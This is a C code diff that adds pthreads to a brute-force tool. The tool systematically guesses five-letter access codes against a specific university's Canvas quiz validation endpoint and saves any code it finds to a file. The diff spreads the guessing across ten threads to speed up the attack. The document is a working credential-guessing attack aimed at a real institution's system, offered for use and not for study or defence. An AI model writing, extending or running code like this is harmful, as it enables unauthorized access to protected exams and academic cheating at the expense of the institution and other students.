@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <time.h>
+#include <pthread.h>
 
 #define URL "https://canvas.ou.edu/api/v1/courses/315691/quizzes/518261/validate_access_code"
 //#define URL "https://canvas.ou.edu/api/v1/courses/315691/quizzes/518259/validate_access_code"
@@ -10,6 +11,11 @@
 struct MemoryStruct {
     char *memory;
     size_t size;
+};
+
+struct args{
+    char* canvas_key;
+    int a;
 };
 
 // Write callback function to handle received data
@@ -191,14 +197,17 @@ int test_word(char* canvas_key, char* code){
 	return correct;
 }
 
-int systematic_guessing(char* canvas_key, int a, int b, int c, int d, int e){
+void* systematic_guessing(void* v){
+	struct args *arg = (struct args *) v;
+	char* canvas_key = arg->canvas_key;
+	int a = arg->a;
 	char letters[26] = "abcdefghijklmnopqrstuvwxyz";
 	
 	for(int zero = a; zero < 26; zero++){
-		for(int one = b; one < 26; one++){
-			for(int two = c; two < 26; two++){
-				for(int three = d; three < 26; three++){
-					for(int four = e; four < 26; four++){
+		for(int one = 0; one < 26; one++){
+			for(int two = 0; two < 26; two++){
+				for(int three = 0; three < 26; three++){
+					for(int four = 0; four < 26; four++){
 						char* word = malloc(5*sizeof(char));
 						word[0] = letters[zero];
 						word[1] = letters[one];
@@ -217,7 +226,8 @@ int systematic_guessing(char* canvas_key, int a, int b, int c, int d, int e){
 							fprintf(f, "Code: %s\n", word);
 							fclose(f);
 
-							return correct;
+							
+							return (void*)correct;
 						}
 						free(word);
 					}
@@ -226,7 +236,7 @@ int systematic_guessing(char* canvas_key, int a, int b, int c, int d, int e){
 		}
 	}
 
-	return 0;
+	return (void*)0;
 }
 
 int main(int argc, char *argv[]){
@@ -238,13 +248,33 @@ int main(int argc, char *argv[]){
 	
 	char* canvas_key = argv[1];
 	//printf("%s\n", canvas_key);
+	
 
-	//int correct = random_guessing(canvas_key);
-	int a = 0, b = 0, c = 0, d = 0, e = 0;
-	int correct = systematic_guessing(canvas_key, a, b, c, d, e);
-	if(correct == 1){
-		printf("Found answer\n");
+	int a = 0; //change this to change how far in the outer loop you want to skip	
+
+	int n = 10; //how many threads to spawn 
+	struct args arg[n];
+
+	//arg.canvas_key = canvas_key;
+	//arg.a = a;
+
+	pthread_t thread_id[n];
+        for(int i = 0; i < n; i++){
+	    arg[i].canvas_key = canvas_key;
+	    arg[i].a = i + a;
+	    pthread_create(&thread_id[i], NULL, systematic_guessing, &arg[i]); 
 	}
+
+	for(int i = 0; i < n; i++){
+	    pthread_join(thread_id[i], NULL);
+	}
+	//pthread_join(thread_id, NULL); 
+	//int correct = random_guessing(canvas_key);
+	//int a = 0, b = 0, c = 0, d = 0, e = 0;
+	//int correct = systematic_guessing(canvas_key, a, b, c, d, e);
+	//if(correct == 1){
+	//	printf("Found answer\n");
+	//}
 
 	return 0;
 }
